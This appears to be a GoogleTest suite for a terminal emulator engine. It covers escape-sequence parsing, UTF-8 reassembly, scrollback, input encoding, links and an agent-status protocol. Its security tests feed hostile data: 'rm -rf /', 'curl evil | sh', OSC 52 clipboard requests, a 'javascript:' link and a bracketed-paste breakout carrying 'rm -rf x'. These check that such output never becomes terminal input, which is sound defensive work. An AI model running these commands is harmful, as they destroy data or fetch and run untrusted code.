// VtEngine: parsing, query replies (OSC 7501 before DA1), input encoding, history and links.
#include "agentdesk/terminal/vt_engine.hpp"

#include <filesystem>
#include <fstream>
#include <iterator>
#include <random>
#include <set>
#include <sstream>
#include <string>

#include <gtest/gtest.h>

using agentdesk::terminal::Key;
using agentdesk::terminal::kModCtrl;
using agentdesk::terminal::ScreenSnapshot;
using agentdesk::terminal::StatusKind;
using agentdesk::terminal::StatusState;
using agentdesk::terminal::VtEngine;
using agentdesk::terminal::VtEngineOptions;

namespace {

std::string load_fixture(const std::string& relative) {
    const auto path = std::filesystem::path(AGENTDESK_FIXTURE_DIR) / relative;
    std::ifstream in(path, std::ios::binary);
    EXPECT_TRUE(in.good()) << path;
    return {std::istreambuf_iterator<char>(in), std::istreambuf_iterator<char>()};
}

VtEngineOptions small_options() {
    VtEngineOptions o;
    o.rows = 10;
    o.cols = 40;
    return o;
}

// Text dump of everything a renderer depends on: chars, widths, attrs, colours, cursor,
// title, alt screen, history and program status.
std::string dump(const VtEngine& e) {
    const ScreenSnapshot s = e.snapshot();
    std::ostringstream out;
    out << "size " << s.rows << "x" << s.cols << " cursor " << s.cursor.row << "," << s.cursor.col
        << (s.cursor.visible ? " v" : " h") << " alt " << s.alt_screen << " title [" << s.title << "]\n";
    for (int r = 0; r < s.rows; ++r) {
        for (int c = 0; c < s.cols; ++c) {
            const auto& cell = s.at(r, c);
            out << std::hex;
            for (const char32_t cp : cell.chars) {
                if (cp == 0)
                    break;
                out << static_cast<std::uint32_t>(cp) << '+';
            }
            out << std::dec << '/' << int(cell.width) << '/' << int(cell.attrs) << '/' << cell.default_fg
                << int(cell.fg.r) << ',' << int(cell.fg.g) << ',' << int(cell.fg.b) << ' ';
        }
        out << '\n';
    }
    for (const auto& line : e.history()) {
        out << "H" << line.line_id << ':' << line.cells.size() << '\n';
    }
    for (const auto& [id, rec] : e.status().records()) {
        out << "S[" << id << "]" << to_string(rec.report.state) << '\n';
    }
    return out.str();
}

std::string feed_with_cuts(const std::string& bytes, std::vector<std::size_t> cuts,
                           std::string* pty_out = nullptr) {
    VtEngine e(small_options());
    std::size_t pos = 0;
    cuts.push_back(bytes.size());
    std::string replies;
    for (const auto cut : cuts) {
        e.feed(std::string_view(bytes).substr(pos, cut - pos));
        replies += e.take_pty_input();
        pos = cut;
    }
    if (pty_out != nullptr) {
        *pty_out = replies;
    }
    return dump(e);
}

}  // namespace

class VtChunkingTest : public ::testing::TestWithParam<std::string> {};

TEST_P(VtChunkingTest, AnySplitMatchesWholeInput) {
    const std::string input = load_fixture(GetParam());
    ASSERT_FALSE(input.empty());
    std::string golden_replies;
    const std::string golden = feed_with_cuts(input, {}, &golden_replies);
    for (std::size_t cut = 1; cut < input.size(); ++cut) {
        std::string replies;
        ASSERT_EQ(feed_with_cuts(input, {cut}, &replies), golden) << "cut at " << cut;
        ASSERT_EQ(replies, golden_replies) << "cut at " << cut;
    }
    std::mt19937 rng(20261117u);
    for (int round = 0; round < 200 && input.size() > 1; ++round) {
        std::set<std::size_t> cuts;
        for (int i = 0; i < 8; ++i) {
            cuts.insert(1 + rng() % (input.size() - 1));
        }
        ASSERT_EQ(feed_with_cuts(input, {cuts.begin(), cuts.end()}), golden) << "round " << round;
    }
}

INSTANTIATE_TEST_SUITE_P(Fixtures, VtChunkingTest,
                         ::testing::Values("bytes/mixed_sgr_utf8.bin", "bytes/scrolling_output.bin",
                                           "bytes/status_query_then_da.bin"));

// Regression: libvterm 0.3.3 alone turns this split into U+FFFD (cut after 0xE8 or 0xE8 0xA1).
TEST(VtEngine, Utf8SplitBeforeControlCharsIsReassembled) {
    const std::string whole = "x50\xe8\xa1\x8c\r\nline";
    for (const std::size_t cut : {4u, 5u}) {
        VtEngine e(small_options());
        e.feed(std::string_view(whole).substr(0, cut));
        e.feed(std::string_view(whole).substr(cut));
        const auto s = e.snapshot();
        EXPECT_EQ(s.row_text(0), "x50\xe8\xa1\x8c") << "cut " << cut;
        EXPECT_EQ(s.row_text(1), "line") << "cut " << cut;
    }
}

TEST(VtEngine, HeldUtf8BytesAreFlushedAtProcessExit) {
    VtEngine e(small_options());
    e.feed("a\xe8");
    EXPECT_EQ(e.pending_utf8_bytes(), 1u);
    e.on_process_exit();
    EXPECT_EQ(e.pending_utf8_bytes(), 0u);  // handed to libvterm, not dropped
}

TEST(VtEngine, RepliesToDeviceStatusAndCursorPosition) {
    VtEngine e(small_options());
    e.feed("AB\x1b[6n");
    EXPECT_EQ(e.take_pty_input(), "\x1b[1;3R");
    e.feed("\x1b[5n");
    EXPECT_EQ(e.take_pty_input(), "\x1b[0n");
}

TEST(VtEngine, Osc7501QueryReplyPrecedesDa1Reply) {
    VtEngine e(small_options());
    e.feed(load_fixture("bytes/status_query_then_da.bin"));
    const std::string replies = e.take_pty_input();
    const auto status_pos = replies.find("\x1b]7501;?\x1b\\");
    const auto da_pos = replies.find("\x1b[?");
    ASSERT_NE(status_pos, std::string::npos) << "no OSC 7501 reply";
    ASSERT_NE(da_pos, std::string::npos) << "no DA1 reply";
    EXPECT_LT(status_pos, da_pos);
    EXPECT_TRUE(e.status_query_answered());
}

TEST(VtEngine, Osc7501ReportsUpdateStoreAndProcessExitDropsBlocked) {
    VtEngine e(small_options());
    e.feed(load_fixture("bytes/mixed_sgr_utf8.bin"));
    const auto* root = e.status().root();
    ASSERT_NE(root, nullptr);
    EXPECT_EQ(root->report.state, StatusState::kBlocked);
    EXPECT_EQ(root->report.kind, StatusKind::kPermission);
    EXPECT_EQ(root->report.msg, "need approval");
    e.on_process_exit();
    EXPECT_EQ(e.status().root(), nullptr);
}

TEST(VtEngine, ShellPromptOsc133ClearsWorking) {
    VtEngine e(small_options());
    e.feed("\x1b]7501;state=working\x07");
    ASSERT_NE(e.status().root(), nullptr);
    e.feed("\x1b]133;A\x07");
    EXPECT_EQ(e.status().root(), nullptr);
}

TEST(VtEngine, WideCharsAndCombiningMarksOccupyCorrectCells) {
    VtEngine e(small_options());
    e.feed("中e\xCC\x81x");  // U+4E2D, e + U+0301, x
    const auto s = e.snapshot();
    EXPECT_EQ(s.at(0, 0).width, 2);
    EXPECT_EQ(s.at(0, 1).width, 0);  // continuation cell
    EXPECT_EQ(s.at(0, 2).chars[0], U'e');
    EXPECT_EQ(s.at(0, 2).chars[1], U'́');
    EXPECT_EQ(s.at(0, 3).chars[0], U'x');
    EXPECT_EQ(s.row_text(0), "中e\xCC\x81x");
}

TEST(VtEngine, TitleIsSanitized) {
    VtEngine e(small_options());
    e.feed("\x1b]2;bad\x1btitle\x07");
    EXPECT_EQ(e.snapshot().title.find('\x1b'), std::string::npos);
}

TEST(VtEngine, OversizedOscIsDiscardedWhole) {
    VtEngineOptions o = small_options();
    o.max_osc_bytes = 64;
    VtEngine e(o);
    e.feed("\x1b]7501;state=working:app=" + std::string(100, 'a') + "\x07");
    EXPECT_EQ(e.status().root(), nullptr);
}

TEST(VtEngine, HistoryIsBoundedByLinesAndAltScreenIsExcluded) {
    VtEngineOptions o = small_options();
    o.history.max_lines = 5;
    VtEngine e(o);
    e.feed(load_fixture("bytes/scrolling_output.bin"));
    EXPECT_EQ(e.history().size(), 5u);
    EXPECT_TRUE(e.history_truncated());
    const auto before = e.history().size();
    e.feed("\x1b[?1049h");
    for (int i = 0; i < 30; ++i)
        e.feed("alt line\r\n");
    e.feed("\x1b[?1049l");
    EXPECT_EQ(e.history().size(), before);
    EXPECT_EQ(e.history().back().line_id, e.first_history_line_id() + 4);
}

TEST(VtEngine, HistoryIsBoundedByBytes) {
    VtEngineOptions o = small_options();
    o.history.max_bytes = 8 * 1024;
    VtEngine e(o);
    e.feed(load_fixture("bytes/scrolling_output.bin"));
    EXPECT_LE(e.history_bytes(), o.history.max_bytes);
    EXPECT_TRUE(e.history_truncated());
}

TEST(VtEngine, CursorKeysFollowApplicationMode) {
    VtEngine e(small_options());
    e.key(Key::kUp);
    EXPECT_EQ(e.take_pty_input(), "\x1b[A");
    e.feed("\x1b[?1h");  // DECCKM application cursor keys
    e.key(Key::kUp);
    EXPECT_EQ(e.take_pty_input(), "\x1bOA");
}

TEST(VtEngine, CtrlCAndTextEncodeAsExpected) {
    VtEngine e(small_options());
    e.text(U'c', kModCtrl);
    EXPECT_EQ(e.take_pty_input(), "\x03");
    e.text(U'測');
    EXPECT_EQ(e.take_pty_input(), "測");
    e.key(Key::kEnter);
    EXPECT_EQ(e.take_pty_input(), "\r");
}

TEST(VtEngine, PasteIsBracketedOnlyWhenEnabledAndEndMarkerStripped) {
    VtEngine e(small_options());
    e.paste("a\nb\r\nc");
    EXPECT_EQ(e.take_pty_input(), "a\rb\rc");  // without bracketed paste, line breaks are Enter
    e.feed("\x1b[?2004h");
    e.paste("x\x1b[201~y");
    EXPECT_EQ(e.take_pty_input(), "\x1b[200~xy\x1b[201~");
    EXPECT_THROW(e.paste(std::string("a\0b", 3)), std::invalid_argument);
}

// Removing one end marker must not leave a new one formed from the bytes around it.
TEST(VtEngine, PasteStripsEndMarkerReformedByRemoval) {
    VtEngine e(small_options());
    e.feed("\x1b[?2004h");
    e.paste("\x1b[20\x1b[201~1~rm -rf x\r");
    std::string sent = e.take_pty_input();
    ASSERT_TRUE(sent.starts_with("\x1b[200~"));
    ASSERT_TRUE(sent.ends_with("\x1b[201~"));
    EXPECT_EQ(sent.substr(6, sent.size() - 12).find("\x1b[201~"), std::string::npos)
        << "pasted text escaped the bracket";
    // Nested: every removal forms the next marker.
    e.paste("\x1b[2\x1b[20\x1b[201~1~01~x");
    sent = e.take_pty_input();
    ASSERT_GE(sent.size(), 12u);
    EXPECT_EQ(sent.substr(6, sent.size() - 12).find("\x1b[201~"), std::string::npos);
}

// Once ConPTY asks for win32-input-mode (even split across writes),
// modified Enter and Escape go as key-down + key-up win32 events; plain Enter stays CR.
TEST(VtEngine, Win32InputModeEncodesModifiedEnterAndEscape) {
    VtEngine e(small_options());
    e.key(Key::kEnter, agentdesk::terminal::kModShift);
    EXPECT_EQ(e.take_pty_input(), "\x1b[13;2u");  // libvterm's own encoding until asked
    e.key(Key::kEscape);
    EXPECT_EQ(e.take_pty_input(), "\x1b");
    e.feed("\x1b[?90");
    e.feed("01h");
    EXPECT_TRUE(e.win32_input());
    e.key(Key::kEnter, agentdesk::terminal::kModShift);
    EXPECT_EQ(e.take_pty_input(), "\x1b[13;28;13;1;16;1_\x1b[13;28;13;0;16;1_");
    e.key(Key::kEnter, kModCtrl);
    EXPECT_EQ(e.take_pty_input(), "\x1b[13;28;10;1;8;1_\x1b[13;28;10;0;8;1_");
    e.key(Key::kEnter, agentdesk::terminal::kModAlt);
    EXPECT_EQ(e.take_pty_input(), "\x1b[13;28;13;1;2;1_\x1b[13;28;13;0;2;1_");
    e.key(Key::kEnter);
    EXPECT_EQ(e.take_pty_input(), "\r");
    e.key(Key::kEscape);
    EXPECT_EQ(e.take_pty_input(), "\x1b[27;1;27;1;0;1_\x1b[27;1;27;0;0;1_");
    e.feed("x\x1b[?9001h y \x1b[?9001l");
    EXPECT_FALSE(e.win32_input());
    e.key(Key::kEscape);
    EXPECT_EQ(e.take_pty_input(), "\x1b");
}

// Soft-wrapped rows are flagged on the screen and in history; hard line breaks are not.
TEST(VtEngine, SoftWrapIsFlaggedOnScreenAndInHistory) {
    VtEngineOptions o;
    o.rows = 3;
    o.cols = 5;
    VtEngine e(o);
    e.feed("abcdefg\r\nhi");
    auto s = e.snapshot();
    EXPECT_TRUE(s.row_wrapped(0));
    EXPECT_FALSE(s.row_wrapped(1));
    EXPECT_FALSE(s.row_wrapped(2));
    e.feed("\r\none\r\ntwo\r\n");  // scrolls "abcde" (wrapped) then "fg" (not) into history
    ASSERT_GE(e.history().size(), 2u);
    EXPECT_TRUE(e.history()[0].wrapped);
    EXPECT_FALSE(e.history()[1].wrapped);
}

// OSC 8 links are remembered with their cells, follow scrolling and vanish when overwritten.
TEST(VtEngine, Osc8LinksFollowTheirCells) {
    VtEngineOptions o;
    o.rows = 4;
    o.cols = 20;
    VtEngine e(o);
    e.feed("see \x1b]8;id=1;file:///C:/x.txt\x1b\\x.txt\x1b]8;;\x1b\\ now");
    auto s = e.snapshot();
    ASSERT_EQ(s.links.size(), 1u);
    EXPECT_EQ(s.links[0], (agentdesk::terminal::Hyperlink{0, 4, 9, "file:///C:/x.txt"}));
    e.feed("\r\n\r\n\r\n\r\n");  // scrolls one line up past the top: the link goes with it
    EXPECT_TRUE(e.snapshot().links.empty());
    e.feed("\x1b[H\x1b]8;;https://a.b\x1b\\ab\x1b]8;;\x1b\\\r\n");
    ASSERT_EQ(e.snapshot().links.size(), 1u);
    e.feed("\r\n");
    s = e.snapshot();
    ASSERT_EQ(s.links.size(), 1u);
    EXPECT_EQ(s.links[0].row, 0);  // not scrolled yet (cursor moved down only)
    e.feed("\x1b[1;1HXY");  // overwritten: no longer a link
    EXPECT_TRUE(e.snapshot().links.empty());
}

TEST(VtEngine, ResizeBumpsGenerationAndClampsSize) {
    VtEngine e(small_options());
    const auto gen = e.generation();
    e.resize(20, 100);
    EXPECT_EQ(e.generation(), gen + 1);
    EXPECT_EQ(e.snapshot().cols, 100);
    e.resize(0, 0);
    const auto s = e.snapshot();
    EXPECT_EQ(s.rows, 1);
    EXPECT_EQ(s.cols, 2);
}

TEST(VtEngine, SeqIncreasesWithEveryVisibleChange) {
    VtEngine e(small_options());
    const auto s0 = e.seq();
    e.feed("x");
    EXPECT_GT(e.seq(), s0);
}

// QA-16: output can never write the clipboard or make the terminal send input on its own.
TEST(VtEngineSecurity, Osc52AndHostileOutputProduceNoInput) {
    VtEngine e(small_options());
    e.feed("\x1b]52;c;aGVsbG8=\x07");             // clipboard write request
    e.feed("\x1b]52;c;?\x07");                    // clipboard read request: must not be answered
    e.feed("rm -rf / \r\n curl evil | sh \r\n");  // text that looks like commands is just text
    e.feed("\x1b]8;;javascript:alert(1)\x07link\x1b]8;;\x07");
    e.feed("\x1bP+q544e\x1b\\");  // XTGETTCAP-style DCS query
    EXPECT_EQ(e.take_pty_input(), "");
    EXPECT_EQ(e.snapshot().row_text(1), " curl evil | sh");  // rendered as plain text only
}

// Mouse reporting: nothing is sent until the program asks; SGR (1006) encodes press/release
// with 1-based cells; drag mode adds motion only while a button is held.
TEST(VtEngine, MouseIsReportedOnlyInTheModeTheProgramAsked) {
    using agentdesk::terminal::MouseAction;
    using agentdesk::terminal::MouseMode;
    VtEngine e;
    e.mouse(2, 4, 1, MouseAction::kPress);
    EXPECT_EQ(e.take_pty_input(), "");
    EXPECT_EQ(e.snapshot().mouse, MouseMode::kNone);

    e.feed("\x1b[?1000h\x1b[?1006h");
    EXPECT_EQ(e.snapshot().mouse, MouseMode::kClick);
    e.mouse(2, 4, 1, MouseAction::kPress);
    e.mouse(2, 4, 1, MouseAction::kRelease);
    EXPECT_EQ(e.take_pty_input(), "\x1b[<0;5;3M\x1b[<0;5;3m");
    e.mouse(3, 4, 0, MouseAction::kMove);  // click mode: no motion
    EXPECT_EQ(e.take_pty_input(), "");
    e.mouse(0, 0, 4, MouseAction::kPress);  // wheel up
    EXPECT_EQ(e.take_pty_input(), "\x1b[<64;1;1M");

    e.feed("\x1b[?1002h");
    EXPECT_EQ(e.snapshot().mouse, MouseMode::kDrag);
    e.mouse(1, 1, 1, MouseAction::kPress);
    e.mouse(1, 2, 0, MouseAction::kMove);
    e.mouse(1, 2, 1, MouseAction::kRelease);
    EXPECT_EQ(e.take_pty_input(), "\x1b[<0;2;2M\x1b[<32;3;2M\x1b[<0;3;2m");

    e.feed("\x1b[?1002l");
    EXPECT_EQ(e.snapshot().mouse, MouseMode::kNone);
    e.mouse(1, 1, 1, MouseAction::kPress);
    EXPECT_EQ(e.take_pty_input(), "");
}

// A theme with its own 16 ANSI colours (a theme file, say) needs the index, not just the RGB.
TEST(VtEngine, CellsRememberWhichOfTheSixteenAnsiColoursTheyUse) {
    VtEngine e(small_options());
    e.feed("\x1b[31mR\x1b[0m\x1b[44mB\x1b[0m\x1b[91mr\x1b[0m\x1b[38;5;200mx\x1b[0m\x1b[38;2;1;2;3my\x1b[0mz");
    const auto s = e.snapshot();
    EXPECT_EQ(s.at(0, 0).fg_ansi, 1);
    EXPECT_EQ(s.at(0, 0).bg_ansi, -1);
    EXPECT_EQ(s.at(0, 1).bg_ansi, 4);
    EXPECT_EQ(s.at(0, 2).fg_ansi, 9);
    EXPECT_EQ(s.at(0, 3).fg_ansi, -1);  // 256-colour index past 15
    EXPECT_EQ(s.at(0, 4).fg_ansi, -1);  // RGB
    EXPECT_EQ(s.at(0, 5).fg_ansi, -1);  // default
}

// The person's rule (2026-11-19): an agent that exits back to the shell prompt leaves no status,
// done and idle included.
TEST(VtEngine, ShellPromptOsc133DropsEveryRecord) {
    for (const char* state : {"idle", "done", "working", "blocked"}) {
        VtEngine e(small_options());
        e.feed(std::string("\x1b]7501;state=") + state + "\x07");
        ASSERT_NE(e.status().root(), nullptr) << state;
        e.feed("\x1b]133;A\x07");
        EXPECT_EQ(e.status().root(), nullptr) << state;
    }
}
